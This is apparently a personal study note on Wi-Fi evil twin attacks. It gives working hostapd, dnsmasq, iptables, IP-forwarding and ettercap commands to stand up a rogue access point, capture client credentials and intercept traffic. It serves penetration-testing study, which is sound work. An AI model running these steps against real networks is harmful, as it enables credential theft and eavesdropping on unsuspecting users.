---
aliases:
  - evil twin
  - evil twin attack
---
# Evil Twin Attacks
In an evil twin attack, you create a [fake AP](../../OPN-attacks/fake-AP.md) with the goal of *tricking client devices into authenticating to it*. The end result is a *username and hashed password* which we can crack using [john](../../../cybersecurity/TTPs/cracking/tools/john.md) or [asleap](https://www.kali.org/tools/asleap/).

In order for the attack to work, clients have to be using devices which are configured *to accept invalid server certificates* or they have to *manually accept* the evil twin's invalid certificate.

If you know the PSK for an AP, you can also use an evil twin attack to setup an AP that *authenticates clients with the same PSK* and use that to perform attacks against clients. If you don't have the PSK, you can create the fake AP using the [OPN](../OPN-attacks/fake-AP.md) network method and wait for clients to connect.
## Attack
To set up a [WPA/WPA2](../../networking/wifi/WPA-WPA2.md)-PSK evil twin (when you already know the PSK/password) do the following:
#### 1. Create `hostapd` config file
Create the following `.conf` file for `hostapd`:
```bash
interface=<INTERFACE>
driver=nl80211
ssid=<SSID>
hw_mode=g
channel=<CHANNEL>
auth_algs=1
wpa=3
wpa_passphrase=<WPA_PASSPHRASE>
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
```
- `interface=<INTERFACE>`: Defines the network interface that will be used to create the Wi-Fi network. This variable should be replaced with the specific name of the interface (e.g., wlan0).
- `driver=nl80211`: Specifies the driver that will be used to manage the Wi-Fi interface. nl80211 is a commonly used driver on Linux systems.
- `ssid=<SSID>`: Defines the name of the wireless network (SSID). This name will be visible to users when they search for available Wi-Fi networks. The variable $SSID should be replaced with the desired name for your network.
- `hw_mode=g`: Sets the hardware mode. In this case, "g" indicates that the network will operate in 802.11g mode, which runs on the 2.4 GHz band.
- `channel=<CHANNEL>`: Specifies the channel on which the network will operate. The value of $CHANNEL should be a number between 1 and 13, depending on the channel you wish to use.
- `auth_algs=1`: >Configures the authentication algorithms. The value 1 indicates that the standard authentication algorithm will be used.
- `wpa=3`: Defines the WPA security protocol to be used. The value 3 indicates that both WPA and WPA2 are allowed.
- `wpa_passphrase=<WPA_PASSPHRASE>`: Sets the password for the Wi-Fi network. The variable $WPA_PASSPHRASE should be replaced with the desired password.
- `wpa_key_mgmt=WPA-PSK`: Indicates that WPA key management will be done using a Pre-Shared Key (PSK).
- `wpa_pairwise=TKIP`: Defines the encryption protocol to be used for WPA. In this case, TKIP (Temporal Key Integrity Protocol) is being used.
- `rsn_pairwise=CCMP`: Sets the encryption protocol to be used for WPA2. CCMP refers to Counter Mode Cipher Block Chaining Message Authentication Code Protocol (Counter Mode CBC-MAC Protocol), which is more secure than TKIP.
#### 2. Create `dnsmasq` config file
Now, configure `dnsmasq` to act as a [DHCP](../../networking/protocols/DHCP.md) server with the following `dnsmasq.conf` file (in `/etc/dnsmasq.conf`):
```bash
interface=<INTERFACE>
dhcp-range=192.168.2.2,192.168.2.100,12h
dhcp-option=3,192.168.2.1
dhcp-option=6,192.168.2.1
server=8.8.8.8
log-queries
log-dhcp
```
#### 3. Start `dnsmasq`
Start `dnsmasq` with the following command, indicating your conf file:
```bash
sudo dnsmasq -C dnsmasq.conf
```
#### 4. Adjust `iptables` to redirect traffic through an interface
You want to redirect traffic to any interface *that has internet access* (usually `eth0`):
```bash
sudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE

sudo iptables --append FORWARD --in-interface <INTERFACE> -j ACCEPT
```
#### 5. Enable packet forwarding for MitM
```bash
sudo sysctl -w net.IPv4.ip_forward=1
```
#### 6. Use `ettercap` to carry out MitM attack
You can use `ettercap` or any other traffic interception tool:
```bash
sudo ettercap -T -q -i <INTERFACE>
```
#### 7. Start the AP
Once everything is ready to go, use `hostapd` to raise the new evil-twin AP:
```bash
sudo hostapd evil-twin.conf
```

> [!Resources]
> - [asleap | Kali Linux Tools](https://www.kali.org/tools/asleap/)
> - [Wifi Challenge Academy](https://academy.wifichallenge.com/courses/take/certified-wifichallenge-professional-cwp/texts/57442980-introduction)
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.